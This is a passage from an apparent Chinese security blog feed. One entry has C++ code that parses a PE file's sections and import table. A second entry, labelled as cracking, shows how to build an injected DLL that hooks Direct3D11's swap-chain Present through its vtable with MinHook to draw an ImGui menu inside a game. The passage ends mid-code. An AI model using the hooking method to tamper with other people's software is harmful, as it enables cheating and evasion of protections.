mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal">a</span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span></span></span></span>，**这个公式很重要，**直接打印文件<code>NameOffset</code>偏移的数据即可</p><p>首先重新编写从VA到RVA的函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD64 <span class="title">dwVAToRVA</span><span class="params">(DWORD64 StartVA, DWORD64 nt_head_file_start, std::string&amp; fileContent, PIMAGE_NT_HEADERS64 ntTempHeader)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    DWORD64 iatDVA = StartVA;</span><br><span class="line"></span><br><span class="line">    DWORD64 iatVA = <span class="number">0</span>;</span><br><span class="line">    DWORD64 RVA = <span class="number">0</span>;</span><br><span class="line">    DWORD64 sectionFileAddr;</span><br><span class="line">    IMAGE_SECTION_HEADER* sectionHeader;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; ntTempHeader-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sectionFileAddr = nt_head_file_start + <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS64) + i * <span class="built_in">sizeof</span>(IMAGE_SECTION_HEADER);</span><br><span class="line">        sectionHeader = (PIMAGE_SECTION_HEADER)(DWORD64)(&amp;fileContent[sectionFileAddr]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sectionHeader-&gt;VirtualAddress &gt; iatDVA)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        iatVA = sectionHeader-&gt;VirtualAddress;</span><br><span class="line">        RVA = iatDVA - iatVA + sectionHeader-&gt;PointerToRawData;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> RVA;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在main函数中打印</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">PIMAGE_IMPORT_DESCRIPTOR temp = <span class="built_in">PIMAGE_IMPORT_DESCRIPTOR</span>((DWORD64)&amp;fileContent[<span class="number">0</span>] + iatRVA + i * <span class="built_in">sizeof</span>(IMAGE_IMPORT_DESCRIPTOR));</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; temp-&gt;Name != <span class="number">0</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    DWORD64 VA = <span class="built_in">dwVAToRVA</span>(temp-&gt;Name, nt_head_file_start, fileContent, ntTempHeader);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;  DLL: &quot;</span> &lt;&lt; (<span class="type">char</span>*)(&amp;fileContent[VA]) &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    temp = <span class="built_in">PIMAGE_IMPORT_DESCRIPTOR</span>(&amp;fileContent[<span class="number">0</span>] + iatRVA + i * <span class="built_in">sizeof</span>(IMAGE_IMPORT_DESCRIPTOR));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151330424.png" alt="image-20250103132758136" /></p><p>同理，<code>IMAGE_IMPORT_DESCRIPTOR</code>中的<code>FirstThunk</code>也可以用于打印导入的函数名，也是将<code>FirstThunk</code>转为RVA，然后直接在源文件中查找RVA位置的字符串即可</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">PIMAGE_IMPORT_DESCRIPTOR temp = <span class="built_in">PIMAGE_IMPORT_DESCRIPTOR</span>((DWORD64)&amp;fileContent[<span class="number">0</span>] + iatRVA + i * <span class="built_in">sizeof</span>(IMAGE_IMPORT_DESCRIPTOR));</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; temp-&gt;Name != <span class="number">0</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    DWORD64 VA = <span class="built_in">dwVAToRVA</span>(temp-&gt;Name, nt_head_file_start, fileContent, ntTempHeader);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;  DLL: &quot;</span> &lt;&lt; (<span class="type">char</span>*)(&amp;fileContent[VA]) &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    VA = *<span class="built_in">PDWORD64</span>(&amp;fileContent[<span class="number">0</span>] + <span class="built_in">dwVAToRVA</span>(temp-&gt;FirstThunk, nt_head_file_start, fileContent, ntTempHeader));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">1</span>; VA != <span class="number">0</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        PIMAGE_IMPORT_BY_NAME IatName = <span class="built_in">PIMAGE_IMPORT_BY_NAME</span>(&amp;fileContent[<span class="number">0</span>] + <span class="built_in">dwVAToRVA</span>(VA, nt_head_file_start, fileContent, ntTempHeader));</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;    -Function &quot;</span> &lt;&lt; IatName-&gt;Name &lt;&lt; std::endl;</span><br><span class="line">        VA = *<span class="built_in">PDWORD64</span>(&amp;fileContent[<span class="number">0</span>] + <span class="built_in">dwVAToRVA</span>(temp-&gt;FirstThunk, nt_head_file_start, fileContent, ntTempHeader) + i * <span class="built_in">sizeof</span>(DWORD64));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    temp = <span class="built_in">PIMAGE_IMPORT_DESCRIPTOR</span>(&amp;fileContent[<span class="number">0</span>] + iatRVA + i * <span class="built_in">sizeof</span>(IMAGE_IMPORT_DESCRIPTOR));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151337251.png" alt="image-20250103133415024" /></p><p>其他类型的<code>IMAGE_DATA_DIRECTORY</code>也是使用类似的方法就可以找到在静态二进制文件中的位置</p><h2 id="最后"><a class="markdownIt-Anchor" href="#最后"></a> 最后</h2><p>完整code:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD64 <span class="title">dwVAToRVA</span><span class="params">(DWORD64 StartVA, DWORD64 nt_head_file_start, std::string&amp; fileContent, PIMAGE_NT_HEADERS64 ntTempHeader)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    DWORD64 iatDVA = StartVA;</span><br><span class="line"></span><br><span class="line">    DWORD64 iatVA = <span class="number">0</span>;</span><br><span class="line">    DWORD64 RVA = <span class="number">0</span>;</span><br><span class="line">    DWORD64 sectionFileAddr;</span><br><span class="line">    IMAGE_SECTION_HEADER* sectionHeader;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; ntTempHeader-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sectionFileAddr = nt_head_file_start + <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS64) + i * <span class="built_in">sizeof</span>(IMAGE_SECTION_HEADER);</span><br><span class="line">        sectionHeader = (PIMAGE_SECTION_HEADER)(DWORD64)(&amp;fileContent[sectionFileAddr]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sectionHeader-&gt;VirtualAddress &gt; iatDVA)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        iatVA = sectionHeader-&gt;VirtualAddress;</span><br><span class="line">        RVA = iatDVA - iatVA + sectionHeader-&gt;PointerToRawData;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> RVA;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">const</span> std::string filePath = <span class="string">&quot;notepad.exe&quot;</span>;</span><br><span class="line">    <span class="function">std::ifstream <span class="title">inputFile</span><span class="params">(filePath, std::ios::in | std::ios::binary)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (!inputFile.<span class="built_in">is_open</span>()) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;cant open: &quot;</span> &lt;&lt; filePath &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    std::ostringstream peFileString;</span><br><span class="line">    peFileString &lt;&lt; inputFile.<span class="built_in">rdbuf</span>();</span><br><span class="line">    std::string fileContent = peFileString.<span class="built_in">str</span>();</span><br><span class="line">    inputFile.<span class="built_in">close</span>();</span><br><span class="line"></span><br><span class="line">    IMAGE_DOS_HEADER* dosHeader = (PIMAGE_DOS_HEADER)(DWORD64)(&amp;fileContent[<span class="number">0</span>]);</span><br><span class="line">    std::cout &lt;&lt; std::hex;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;PE e_magic  : 0x&quot;</span> &lt;&lt; dosHeader-&gt;e_magic &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;PE e_lfanew : 0x&quot;</span> &lt;&lt; dosHeader-&gt;e_lfanew &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    IMAGE_NT_HEADERS64* ntTempHeader = (PIMAGE_NT_HEADERS64)(DWORD64)(&amp;fileContent[dosHeader-&gt;e_lfanew]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SetConsoleOutputCP</span>(CP_UTF8);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;程序位数    : &quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (ntTempHeader-&gt;FileHeader.Machine == <span class="number">0x8664</span>)</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;64位\n&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (ntTempHeader-&gt;FileHeader.Machine == <span class="number">0x014c</span>)</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;32位\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;区段数量: &quot;</span> &lt;&lt; ntTempHeader-&gt;FileHeader.NumberOfSections &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="type">int</span> nt_head_file_start = dosHeader-&gt;e_lfanew;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; ntTempHeader-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        DWORD64 sectionFileAddr = nt_head_file_start + <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS64) + i * <span class="built_in">sizeof</span>(IMAGE_SECTION_HEADER);</span><br><span class="line">        IMAGE_SECTION_HEADER* sectionHeader = (PIMAGE_SECTION_HEADER)(DWORD64)(&amp;fileContent[sectionFileAddr]);</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot; Section[&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;] address: 0x&quot;</span> &lt;&lt; sectionFileAddr &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;            name        : &quot;</span> &lt;&lt; sectionHeader-&gt;Name &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;            VA          : 0x&quot;</span> &lt;&lt; sectionHeader-&gt;VirtualAddress &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;            ptr2RawData : 0x&quot;</span> &lt;&lt; sectionHeader-&gt;PointerToRawData &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;---OptionalHeader.DataDirectories\n&quot;</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;基本重定位表           : 0x&quot;</span> &lt;&lt; ntTempHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;全局指针的相对虚拟地址   : 0x&quot;</span> &lt;&lt; ntTempHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_GLOBALPTR].VirtualAddress &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;导入地址表             : 0x&quot;</span> &lt;&lt; ntTempHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].VirtualAddress &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    DWORD64 iatDVA = ntTempHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;</span><br><span class="line"></span><br><span class="line">    DWORD64 iatVA = <span class="number">0</span>;</span><br><span class="line">    DWORD64 iatRVA = <span class="number">0</span>;</span><br><span class="line">    DWORD64 sectionFileAddr;</span><br><span class="line">    IMAGE_SECTION_HEADER* sectionHeader;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; ntTempHeader-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sectionFileAddr = nt_head_file_start + <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS64) + i * <span class="built_in">sizeof</span>(IMAGE_SECTION_HEADER);</span><br><span class="line">        sectionHeader = (PIMAGE_SECTION_HEADER)(DWORD64)(&amp;fileContent[sectionFileAddr]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sectionHeader-&gt;VirtualAddress &gt; iatDVA)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        iatVA = sectionHeader-&gt;VirtualAddress;</span><br><span class="line">        iatRVA = iatDVA - iatVA + sectionHeader-&gt;PointerToRawData;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">    PIMAGE_IMPORT_DESCRIPTOR temp = <span class="built_in">PIMAGE_IMPORT_DESCRIPTOR</span>((DWORD64)&amp;fileContent[<span class="number">0</span>] + iatRVA + i * <span class="built_in">sizeof</span>(IMAGE_IMPORT_DESCRIPTOR));</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; temp-&gt;Name != <span class="number">0</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        DWORD64 VA = <span class="built_in">dwVAToRVA</span>(temp-&gt;Name, nt_head_file_start, fileContent, ntTempHeader);</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;  DLL: &quot;</span> &lt;&lt; (<span class="type">char</span>*)(&amp;fileContent[VA]) &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">        VA = *<span class="built_in">PDWORD64</span>(&amp;fileContent[<span class="number">0</span>] + <span class="built_in">dwVAToRVA</span>(temp-&gt;FirstThunk, nt_head_file_start, fileContent, ntTempHeader));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">1</span>; VA != <span class="number">0</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            PIMAGE_IMPORT_BY_NAME IatName = <span class="built_in">PIMAGE_IMPORT_BY_NAME</span>(&amp;fileContent[<span class="number">0</span>] + <span class="built_in">dwVAToRVA</span>(VA, nt_head_file_start, fileContent, ntTempHeader));</span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;    -Function &quot;</span> &lt;&lt; IatName-&gt;Name &lt;&lt; std::endl;</span><br><span class="line">            VA = *<span class="built_in">PDWORD64</span>(&amp;fileContent[<span class="number">0</span>] + <span class="built_in">dwVAToRVA</span>(temp-&gt;FirstThunk, nt_head_file_start, fileContent, ntTempHeader) + i * <span class="built_in">sizeof</span>(DWORD64));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        temp = <span class="built_in">PIMAGE_IMPORT_DESCRIPTOR</span>(&amp;fileContent[<span class="number">0</span>] + iatRVA + i * <span class="built_in">sizeof</span>(IMAGE_IMPORT_DESCRIPTOR));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;公众号：&lt;a href=&quot;https://mp.weixin.qq.com/s/RrEZJDeKXdVqtjZPDs7AyQ&quot;&gt;https://mp.weixin.qq.com/s/RrEZJDeKXdVqtjZPDs7AyQ&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="bypass" scheme="https://joe1sn.eu.org/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>【破解】使用hook再游戏内部创建菜单栏</title>
    <link href="https://joe1sn.eu.org/2024/10/11/d3d11-hook/"/>
    <id>https://joe1sn.eu.org/2024/10/11/d3d11-hook/</id>
    <published>2024-10-11T06:12:09.000Z</published>
    <updated>2025-01-26T14:46:00.784Z</updated>
    
    <content type="html"><![CDATA[<p>学习是对技术的祛魅</p><p>公众号：</p><span id="more"></span><p>或许我们的公众号会有更多你感兴趣的内容</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/a0d42261f5e0b243c214f5af9049fc29.jpg" alt="img" /></p><h1 id="direct3d11-注入"><a class="markdownIt-Anchor" href="#direct3d11-注入"></a> Direct3D11 注入</h1><p>在此之前，公众号已经简述了<code>MinHook</code>的原理，那么利用这种原理我们就可以通过hook在d3d编写的游戏中实现窗口</p><p>相关代码：<a href="https://github.com/Joe1sn/dx11-hook-example">https://github.com/Joe1sn/dx11-hook-example</a></p><h2 id="direct3d简述"><a class="markdownIt-Anchor" href="#direct3d简述"></a> Direct3D简述</h2><p>这里使用<code>ImGui</code>的默认dx11版本示例来讲解，首先d3d的绘制依靠的是windows的窗口(window)，接着是D3D设备、上下文和交换链以及各种绘制方法的d3dAPI传入操作系统和GPU，最后传输到显示器显示，大致如下</p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/6ad88f19b612a87f0fb01fa263ec643b.png" alt="d3d" style="zoom:33%;" /><p>那么对于d3d API来说是这样的：</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/95bce98f171ccebac244f038b7c2fdad.png" alt="d3d2" /></p><h2 id="如何显示"><a class="markdownIt-Anchor" href="#如何显示"></a> 如何显示</h2><p>那么最后如何得到渲染好的最终帧呢？答案是交换链的 <code>IDXGISwapChain::Present</code> 方法用于呈现最终渲染的帧</p><p><a href="https://learn.microsoft.com/zh-cn/windows/win32/api/dxgi/nn-dxgi-idxgiswapchain">https://learn.microsoft.com/zh-cn/windows/win32/api/dxgi/nn-dxgi-idxgiswapchain</a></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/4824f10eb0ef21a90370e4945328cdfe.png" alt="image-20240917122252505" /></p><p>具体参数</p><p><a href="https://learn.microsoft.com/zh-cn/windows/win32/api/dxgi/nf-dxgi-idxgiswapchain-present">https://learn.microsoft.com/zh-cn/windows/win32/api/dxgi/nf-dxgi-idxgiswapchain-present</a></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/2f28850b01647a34c57d9de400ec9880.png" alt="image-20240917122310168" /></p><p>那么我们可以hook这个函数，然后提交我们要现实的内容，最后再一同显示出来</p><h2 id="编写dll"><a class="markdownIt-Anchor" href="#编写dll"></a> 编写DLL</h2><p>这里我就是用visual studio 2022 默认的DLL项目</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/5ee8bb5398a29ab79eed633f6e706a8d.png" alt="image-20240917122615650" /></p><p>导入imgui和minhook</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/dd7ca61bd48246964b9157a0cf175503.png" alt="image-20240917122813488" /></p><p>本篇文章将处理的是dx11版本的d3d，那么如何判断游戏是否使用了该dll呢？一般来说是凭借经验，不过也可以使用CE遍历一下DLL即可</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/49035b1e59e676e047d645fdfe4bd7c2.png" alt="image-20240917123134652" /></p><p>如果发现调用了多种图形API，例如OpenGL，Vulkan等，可查看使用调用对应的呈现最终帧的渲染函数，也可以参考kiero的一些做法，链接：<a href="https://github.com/Rebzzel/kiero">https://github.com/Rebzzel/kiero</a></p><p>那么如何找到该函数呢？别忘了最后的dll是注入到程序中的，那么我们的dll也可以使用<code>d3d11.dll</code>，而且前文提到过<code>IDXGISwapChain::Present</code>是<code>IDXGISwapChain</code>下的方法，那么我们如果也要使用该方法，也是会跳转到同一个位置（因为注入后就是同一个程序了，那么对应的dll的内存也是同一块）</p><p>而且<code>Present</code>是虚函数，位置在<code>vtable[8]</code>，</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/599e0ba67c882ef76728154004315291.png" alt="image-20240917131813505" /></p><p>那么可以得到定位函数，这里抄了下imgui例子</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义函数参数</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">long</span><span class="params">(__stdcall* DIGX_Present)</span><span class="params">(IDXGISwapChain*, UINT, UINT)</span></span>;</span><br><span class="line">DIGX_Present originPresent;</span><br><span class="line">DIGX_Present old_present;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">getPresentPtr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Setup swap chain</span></span><br><span class="line">    DXGI_SWAP_CHAIN_DESC sd;</span><br><span class="line">    <span class="built_in">ZeroMemory</span>(&amp;sd, <span class="built_in">sizeof</span>(sd));</span><br><span class="line">    sd.BufferCount = <span class="number">2</span>;</span><br><span class="line">    sd.BufferDesc.Width = <span class="number">0</span>;</span><br><span class="line">    sd.BufferDesc.Height = <span class="number">0</span>;</span><br><span class="line">    sd.BufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;</span><br><span class="line">    <span class="comment">//sd.BufferDesc.RefreshRate.Numerator = 60;         跟随游戏的fps</span></span><br><span class="line">    <span class="comment">//sd.BufferDesc.RefreshRate.Denominator = 1;        跟随游戏</span></span><br><span class="line">    sd.OutputWindow = <span class="built_in">GetForegroundWindow</span>();        <span class="comment">//  跟随游戏窗口</span></span><br><span class="line">    sd.SampleDesc.Count = <span class="number">1</span>;</span><br><span class="line">    sd.Windowed = TRUE;</span><br><span class="line">    sd.SwapEffect = DXGI_SWAP_EFFECT_DISCARD;</span><br><span class="line"></span><br><span class="line">    UINT createDeviceFlags = <span class="number">0</span>;</span><br><span class="line">    IDXGISwapChain* swap_chain;</span><br><span class="line">    ID3D11Device* device;</span><br><span class="line"></span><br><span class="line">    D3D_FEATURE_LEVEL featureLevel;</span><br><span class="line">    <span class="type">const</span> D3D_FEATURE_LEVEL featureLevelArray[<span class="number">2</span>] = &#123; D3D_FEATURE_LEVEL_11_0, D3D_FEATURE_LEVEL_10_0, &#125;;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">D3D11CreateDeviceAndSwapChain</span>(</span><br><span class="line">        <span class="literal">nullptr</span>, </span><br><span class="line">        D3D_DRIVER_TYPE_HARDWARE, </span><br><span class="line">        <span class="literal">nullptr</span>, </span><br><span class="line">        createDeviceFlags, </span><br><span class="line">        featureLevelArray, </span><br><span class="line">        <span class="number">2</span>, </span><br><span class="line">        D3D11_SDK_VERSION, </span><br><span class="line">        &amp;sd, </span><br><span class="line">        &amp;swap_chain,</span><br><span class="line">        &amp;device,</span><br><span class="line">        &amp;featureLevel, </span><br><span class="line">        <span class="literal">nullptr</span>) == S_OK) &#123;</span><br><span class="line">        <span class="type">void</span>** p_vtable = *<span class="built_in">reinterpret_cast</span>&lt;<span class="type">void</span>***&gt;(swap_chain);   <span class="comment">//得到虚函数表</span></span><br><span class="line">        swap_chain-&gt;<span class="built_in">Release</span>();      <span class="comment">//释放</span></span><br><span class="line">        device-&gt;<span class="built_in">Release</span>();          